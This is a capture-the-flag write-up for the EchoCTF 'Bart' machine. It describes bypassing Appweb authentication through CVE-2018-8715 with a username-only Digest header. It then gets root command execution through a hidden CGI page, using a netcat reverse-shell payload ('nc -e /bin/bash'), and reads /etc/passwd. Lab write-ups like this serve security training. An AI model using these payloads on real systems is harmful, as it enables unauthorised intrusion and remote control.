<pre class="">    |\/\  ,.
    /   `' |,-,
   /         /_
 _/            /
(.-,--.       /
/o/  o \     /
\_\    /   _/     Bart.echocity-f.com
(__`--'    _)     Author: HitmanAlharbi
 /         |      Team: Blackfoxs
(_____,'    \  
   \_       _\
     `._..-'
</pre>

<br>

<b> [ BART wrtieup for EchoCTF ] </b>

<br> 

The target machine have one "open port" (8080) 

This port have a service called "Appweb Web Server"

Let's open the URL with port 8080 in the browser because it's web server

When you open the URL it will ask you a password "HTTP Authorization"

We tried default credentials like "admin:admin" but not works

We tried too to brute force the password and username but now works

Okay now we decide to search about <b>"Appweb Web Server" </b>vulnerabilities

We have four CVEs but only one was interesting <b> "CVE-2018-8715"  </b>

https://github.com/embedthis/appweb/issues/610

The CVE Vulnerability Details said that to bypass the the authentication

You should send the Authorization header with username only without password

For example: <b> "Authorization: Digest username=admin" </b>

We test it and really we bypassed the authorization successfully

Now take your flag from the source code and you will discover the main page was fake

We tried to fuzz the URLs but the web server blocked our attempts 

But we know the EchoCTF makers love to use the word <b>"ETSCTF"</b>

Because of that we tried many attempts and we find there is a page called <b>ETSCTF.cgi</b>

The Appweb server can run .cgi files without any problem 

Now this page runs the command "printenv" , first take the two flags from page

The last step to get RCE , try to send a POST request with the parameter "ETSCTF" has the command

For example: <b> "ETSCTF=nc -e /bin/bash target-ip port" </b>

Now you can execute commands with root permissions 

Take all the flags from server like /etc/passwd and /root/ETSCTF and use grep always.

